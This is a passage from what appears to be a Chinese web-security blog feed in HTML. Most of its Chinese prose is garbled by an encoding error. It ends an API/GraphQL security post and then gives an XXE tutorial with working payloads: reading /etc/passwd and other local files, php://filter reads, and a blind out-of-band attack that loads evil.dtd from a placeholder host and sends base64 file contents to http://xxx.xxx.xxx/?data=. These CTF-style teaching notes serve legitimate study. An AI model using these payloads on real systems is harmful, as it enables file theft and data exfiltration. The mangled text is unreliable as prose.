class="string">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Flamin&#x27; Cocktail Glasses&quot;</span>,</span><br><span class="line">            <span class="string">&quot;listed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬å°†query{__typename}å‘é€åˆ°ä»»ä½•GraphQLç«¯ç‚¹ï¼Œå®ƒå°†åœ¨å…¶å“åº”ä¸­çš„æŸå¤„åŒ…å«å­—ç¬¦ä¸²<code>&#123;&quot;data&quot;: &#123;&quot;__typename&quot;: &quot;query&quot;&#125;&#125;</code>ã€‚è¿™ç§°ä¸ºé€šç”¨æŸ¥è¯¢ï¼Œæ˜¯æ¢æµ‹URLæ˜¯å¦å¯¹åº”äºGraphQLæœåŠ¡çš„æœ‰ç”¨å·¥å…·ã€‚è¯¥æŸ¥è¯¢ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºæ¯ä¸ªGraphQLç«¯ç‚¹éƒ½æœ‰ä¸€ä¸ªåä¸º__typenameçš„ä¿ç•™å­—æ®µï¼Œè¯¥å­—æ®µä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›æŸ¥è¯¢å¯¹è±¡çš„ç±»å‹ã€‚å¯èƒ½å­˜åœ¨çš„æ¢æµ‹æ¥å£å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/graphql</span><br><span class="line">/api</span><br><span class="line">/api/graphql</span><br><span class="line">/graphql/api</span><br><span class="line">/graphql/graphql</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿™äº›å¸¸è§ç«¯ç‚¹ä¸è¿”å›GraphQLå“åº”ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°è¯•&#x2F;v1é™„åŠ åˆ°è·¯å¾„ã€‚æˆ‘ä»¬åº”è¯¥ç‰¢è®°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯GraphQLæœåŠ¡é€šå¸¸ä¼šå“åº”ä»»ä½•éGraphQLè¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºâ€æŸ¥è¯¢ä¸å­˜åœ¨â€æˆ–ç±»ä¼¼é”™è¯¯ã€‚</p><p>5ä¸ªæœ€å¸¸è§çš„GraphQLå®‰å…¨æ¼æ´ <a href="https://zhuanlan.zhihu.com/p/554808001">https://zhuanlan.zhihu.com/p/554808001</a></p><h2 id="å®è·µ"><a href="#å®è·µ" class="headerlink" title="å®è·µ"></a>å®è·µ</h2><p><a href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a></p><h2 id="APIå®‰å…¨é˜²æŠ¤è§†è§’"><a href="#APIå®‰å…¨é˜²æŠ¤è§†è§’" class="headerlink" title="APIå®‰å…¨é˜²æŠ¤è§†è§’"></a>APIå®‰å…¨é˜²æŠ¤è§†è§’</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-2.png"></p><ul><li>è®¾æ³•å°† API å®‰å…¨é˜²æŠ¤æ ‡å‡†å’Œå®è·µæ•´åˆåˆ°ä¼ä¸šçš„è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸä¸­</li><li>å°† API æ–‡æ¡£å’Œè‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•çº³å…¥æŒç»­é›†æˆ&#x2F;æŒç»­äº¤ä»˜ (CI&#x2F;CD) ç®¡é“</li><li>ç¡®ä¿å¯¹ API åº”ç”¨é€‚å½“ä¸”æœ‰æ•ˆçš„èº«ä»½éªŒè¯å’Œæˆæƒæ§åˆ¶</li><li>å®æ–½é€Ÿç‡é™åˆ¶æªæ–½ï¼Œå¸®åŠ©é˜²æ­¢ API æ»¥ç”¨æˆ–å´©æºƒ</li><li>ä½¿ç”¨ä¸“ç”¨ç½‘å…³å’Œ&#x2F;æˆ–å†…å®¹äº¤ä»˜ç½‘ç»œå¢å¼ºé€Ÿç‡é™åˆ¶å’Œå…¶ä»–åº”ç”¨ç¨‹åºçº§æªæ–½ï¼Œä»¥æŠµå¾¡åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ (DDoS) æ”»å‡»</li><li>è®© API å®‰å…¨é˜²æŠ¤æµ‹è¯•æˆä¸ºæ›´å¤§èŒƒå›´çš„åº”ç”¨ç¨‹åºæµ‹è¯•æµç¨‹ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†</li><li>æ‰§è¡ŒæŒç»­çš„ API å‘ç°</li><li>å®æ–½ç³»ç»ŸåŒ–çš„æ–¹æ³•æ¥è¯†åˆ«å’Œä¿®å¤å¸¸è§ API æ¼æ´ï¼ŒåŒ…æ‹¬OWASP åå¤§ API å®‰å…¨é£é™©</li><li>ä½¿ç”¨åŸºäºç­¾åçš„å¨èƒæ£€æµ‹å’Œé¢„é˜²ï¼Œä½œä¸ºé’ˆå¯¹å·²çŸ¥ API æ”»å‡»çš„åŸºå‡†çº§é˜²æŠ¤</li><li>åˆ©ç”¨ AI å’Œè¡Œä¸ºåˆ†ææ¥å¢å¼ºåŸºäºç­¾åçš„æ£€æµ‹ï¼Œä½¿ API å¨èƒæ£€æµ‹çš„æ‰©å±•æ€§ã€å‡†ç¡®æ€§å’Œä¸šåŠ¡ç›¸å…³æ€§æ›´å¼ºï¼Œå¹¶ä¸”èƒ½å¤ŸæŠµå¾¡æ–°å‹å¨èƒ</li><li>ç¡®ä¿ API å®‰å…¨ç›‘æ§å’Œåˆ†ææŒç»­æ•°å‘¨å¹¶è¦†ç›–å¤šä¸ª API ä¼šè¯</li><li>ä½œä¸ºå¯¹ API å®‰å…¨ç›‘æ§å’Œå‘Šè­¦çš„è¡¥å……ï¼Œä¸ºå¨èƒæœå¯»äººå‘˜ã€å¼€å‘äººå‘˜ã€DevOps å’Œæ”¯æŒäººå‘˜æä¾›å¯¹ API æ¸…å•å’Œæ´»åŠ¨æ•°æ®çš„æŒ‰éœ€è®¿é—®æƒé™</li></ul><p>API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆåŒ…å«å“ªäº›å†…å®¹ï¼Ÿ</p><ul><li>èº«ä»½éªŒè¯å’Œæˆæƒï¼š API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆæ¶‰åŠå¯¹è®¿é—® API çš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯å’Œæˆæƒï¼Œç¡®ä¿åªæœ‰å·²è·å¾—æˆæƒçš„ç”¨æˆ·æ‰èƒ½è®¿é—®å’Œæ“ä½œæ•°æ®ã€‚èº«ä»½éªŒè¯æ–¹æ³•åŒ…æ‹¬å¤šé‡èº«ä»½éªŒè¯ã€OAuthã€OpenID Connect å’Œ API å¯†é’¥ï¼Œè€Œæˆæƒæ–¹æ³•åŒ…æ‹¬åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶å’ŒåŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</li><li>API ç½‘å…³ï¼š API ç½‘å…³ä½œä¸ºæ‰€æœ‰ API è¯·æ±‚çš„å…¥å£ç‚¹ï¼Œæ˜¯ç»¼åˆæ€§ API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆçš„ç»„æˆéƒ¨åˆ†ã€‚ç½‘å…³å¯ä»¥æ‰§è¡Œå¤šç§åŠŸèƒ½ï¼ŒåŒ…æ‹¬èº«ä»½éªŒè¯ã€é€Ÿç‡é™åˆ¶ã€æµé‡ç®¡ç†å’Œç¼“å­˜ï¼Œå¹¶ä¸”æœ‰åŠ©äºé˜²æ­¢åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ (DDoS) ç­‰æ”»å‡»ã€‚</li><li>åŠ å¯†ï¼š API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆè¿˜æ¶‰åŠåŠ å¯†ï¼Œç”¨äºä¿æŠ¤é€šè¿‡ API ä¼ è¾“çš„æ•°æ®çš„å®‰å…¨ï¼Œç¡®ä¿æ”»å‡»è€…æ— æ³•æ‹¦æˆªæ•°æ®ã€‚åŠ å¯†æŠ€æœ¯åŒ…æ‹¬ SSLã€TLS å’Œ AES åŠ å¯†ï¼Œå¯ç”¨äºåŠ å¯† API è¯·æ±‚ã€å“åº”å’Œé™æ€æ•°æ®ã€‚</li><li>é€Ÿç‡é™åˆ¶ï¼š é€Ÿç‡é™åˆ¶æ˜¯ API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆçš„ä¸€é¡¹åŠŸèƒ½ï¼Œé€šè¿‡é™åˆ¶ç”¨æˆ·åœ¨æŒ‡å®šæ—¶é—´æ®µå†…å¯ä»¥å‘å‡ºçš„è¯·æ±‚æ•°é‡ï¼Œæ¥å¸®åŠ©é˜²æ­¢æ‹’ç»æœåŠ¡æ”»å‡»ã€‚é€Ÿç‡é™åˆ¶å¯ä»¥æŒ‰ä¸åŒçš„ IP åœ°å€ã€ç”¨æˆ·å¸æˆ·æˆ–å…¶ä»–å‚æ•°æ¥è®¾ç½®ï¼Œæœ‰åŠ©äºé˜²æ­¢æ”»å‡»è€…ç”¨å¤§é‡è¯·æ±‚æ·¹æ²¡ APIã€‚</li><li>å®¡è®¡å’Œæ—¥å¿—è®°å½•ï¼š API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆè¿˜åº”åŒ…æ‹¬å®¡è®¡å’Œæ—¥å¿—è®°å½•ï¼Œé€šè¿‡ç›‘æµ‹ API æ´»åŠ¨æ¥å¸®åŠ©æ£€æµ‹å’ŒæŠµå¾¡å®‰å…¨å¨èƒã€‚å®¡è®¡æ¶‰åŠè·Ÿè¸ª API è¯·æ±‚å’Œå“åº”ï¼Œè€Œæ—¥å¿—è®°å½•æ¶‰åŠç”¨å®‰å…¨ã€é˜²ç¯¡æ”¹çš„æ–¹å¼è®°å½• API äº‹ä»¶å’Œæ´»åŠ¨ã€‚</li><li>API æµ‹è¯•ï¼š API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆè¿˜æ¶‰åŠå¯¹ API è¿›è¡Œæµ‹è¯•ï¼Œä»¥è¯†åˆ«æ¼æ´å’Œæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚API æµ‹è¯•å¯ä»¥æ‰‹åŠ¨æ‰§è¡Œæˆ–ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ‰§è¡Œï¼Œæœ‰åŠ©äºç¡®ä¿ API å®‰å…¨æ— è™å’ŒæŒ‰é¢„æœŸè¿è¡Œã€‚</li><li>API ç›‘æ§å’Œè¿è¡Œæ—¶ä¿æŠ¤ï¼š API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆå¿…é¡»å¯¹ API è¡Œä¸ºè¿›è¡Œç›‘æ§ã€‚äº†è§£æ­£å¸¸è¡Œä¸ºä¸å¼‚å¸¸æ»¥ç”¨çš„åŒºåˆ«æ˜¯ä¿æŠ¤ API å…é­æ¶æ„æ”»å‡»çš„é‡è¦éƒ¨åˆ†ã€‚</li><li>æ¼æ´ç®¡ç†ï¼š API å®‰å…¨é˜²æŠ¤è§£å†³æ–¹æ¡ˆè¿˜æ¶‰åŠæ¼æ´ç®¡ç†ï¼Œè¿™åŒ…æ‹¬è¯†åˆ«å’Œè§£å†³ API ä¸­çš„å®‰å…¨æ¼æ´ã€‚æ¼æ´ç®¡ç†å¯ä»¥åŒ…æ‹¬æ¼æ´æ‰«æã€ä¿®è¡¥å’Œä¿®å¤ï¼Œå¯å¸®åŠ©é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨ API ä¸­çš„å·²çŸ¥æ¼æ´ã€‚</li></ul><p>Spring Security çš„ REST API ä¸å¾®æœåŠ¡å®‰å…¨ï¼ˆ2024 æœ€æ–°ç‰ˆï¼‰ <a href="https://developer.aliyun.com/article/1487156">https://developer.aliyun.com/article/1487156</a></p><p>æˆ‘æ„Ÿè§‰å…¶å®webå®‰å…¨å°±æ˜¯åœ¨å¯¹apiè¿›è¡Œæµ‹è¯•ï¼Œå…¶å®éƒ½æ˜¯å’Œåç«¯è¿›è¡Œäº¤æµï¼Œåªæ˜¯äº¤æµçš„è¯­è¨€æ–¹å¼ä¸åŒç½¢äº†ï¼Œæ‰€ä»¥æµ‹è¯•æ–¹å¼ä¹Ÿéƒ½ç±»ä¼¼ï¼Œåªæ˜¯è§„èŒƒåŒ–çš„apiä¼šæä¾›ç›¸åº”çš„è¯å…¸ï¼Œä¸€å®šç¨‹åº¦ä¸Šæ›´åŠ æ–¹ä¾¿äº†fuzz</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘XXEï¼ˆXML External Entityï¼‰æ¼æ´</title>
      <link href="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/"/>
      <url>/2024/09/24/WebSecurity/owasptop/xmlexternalentity/</url>
      
        <content type="html"><![CDATA[<p>CTF XXE <a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a><br>XXEæ¼æ´åˆ©ç”¨æŠ€å·§ï¼šä»XMLåˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ <a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ˜¯ä¸€ç§é’ˆå¯¹åº”ç”¨ç¨‹åºå¤„ç†XMLæ•°æ®çš„æ–¹å¼çš„æ”»å‡»ã€‚åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åˆ©ç”¨åº”ç”¨ç¨‹åºå¯¹XMLè¾“å…¥çš„å¤„ç†ä¸å½“ï¼Œå¼•å…¥æˆ–â€œæ³¨å…¥â€æ¶æ„å†…å®¹ã€‚è¿™å¯èƒ½å¯¼è‡´æœªæˆæƒçš„æ•°æ®è®¿é—®ã€æœåŠ¡æ‹’ç»æ”»å‡»ç”šè‡³æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬ï¼šXMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XMLå£°æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTDï¼Œè¿™éƒ¨åˆ†å¯é€‰çš„--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTDï¼šDocument Type Definition å³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ï¼Œç”±äºå…¶æ”¯æŒçš„æ•°æ®ç±»å‹æœ‰é™ï¼Œæ— æ³•å¯¹å…ƒç´ æˆ–å±æ€§çš„å†…å®¹è¿›è¡Œè¯¦ç»†è§„èŒƒï¼Œåœ¨å¯è¯»æ€§å’Œå¯æ‰©å±•æ€§æ–¹é¢ä¹Ÿæ¯”ä¸ä¸ŠXML Schemaã€‚<br>DTDä¸€èˆ¬è®¤ä¸ºæœ‰ä¸¤ç§å¼•ç”¨æˆ–å£°æ˜æ–¹å¼ï¼š<br>1ã€å†…éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨XMLæ–‡æ¡£ä¸­ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- admin --&gt;</span></span><br></pre></td></tr></table></figure><p>2ã€å¤–éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„DTDæ–‡ä»¶ï¼ˆ.dtdï¼‰ä¸­ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br></pre></td></tr></table></figure><p>å‚æ•°å®ä½“</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1;<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- awsl --&gt;</span></span><br></pre></td></tr></table></figure><p>å¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒï¼Œä½†å­˜åœ¨ä¸€äº›é€šç”¨çš„åè®®ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image.png"><br>ä¸Šå›¾æ˜¯é»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥æ”¯æŒå…¶ä»–ï¼Œå¦‚PHPæ”¯æŒçš„æ‰©å±•åè®®æœ‰<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-1.png"></p><h2 id="XXEæ¼æ´ç±»å‹"><a href="#XXEæ¼æ´ç±»å‹" class="headerlink" title="XXEæ¼æ´ç±»å‹"></a>XXEæ¼æ´ç±»å‹</h2><h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><p>ç›´æ¥è¯»å–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¼•å…¥å¤–éƒ¨å®ä½“</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps-ip/hack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å¤–éƒ¨å®ä½“ --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><p>æ— å›æ˜¾çš„æƒ…å†µä¸‹</p><p>åŸºäºOOB(Out of Bandçš„ç¼©å†™ï¼ŒæŒ‡å®‰å…¨æ•°æ®ä¸ç»è¿‡è‡ªå·±é€šä¿¡çš„ä¿¡é“è¿›è¡Œä¼ è¾“)ï¼Œå…ˆä½¿ç”¨php:&#x2F;&#x2F;filterè·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥httpè¯·æ±‚å‘é€åˆ°æ¥å—æ•°æ®çš„æœåŠ¡å™¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtdçš„å†…å®¹ï¼Œå†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ&amp;#x25ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>è®¿é—®æ¥å—æ•°æ®çš„æœåŠ¡å™¨ä¸­çš„æ—¥å¿—ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡base64ç¼–ç è¿‡çš„æ•°æ®ï¼Œè§£ç åä¾¿å¯ä»¥å¾—åˆ°æ•°æ®ã€‚</p><p>åŸºäºæŠ¥é”™<br>åŸºäºæŠ¥é”™çš„åŸç†å’ŒOOBç±»ä¼¼ï¼ŒOOBé€šè¿‡æ„é€ ä¸€ä¸ªå¸¦å¤–çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œè€ŒåŸºäºæŠ¥é”™æ˜¯æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚</p><ul><li>é€šè¿‡å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://blog.szfszf.top/xml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- xml.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%start;</span><br></pre></td></tr></table></figure></li><li>é€šè¿‡å¼•å…¥æœ¬åœ°æ–‡ä»¶ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span 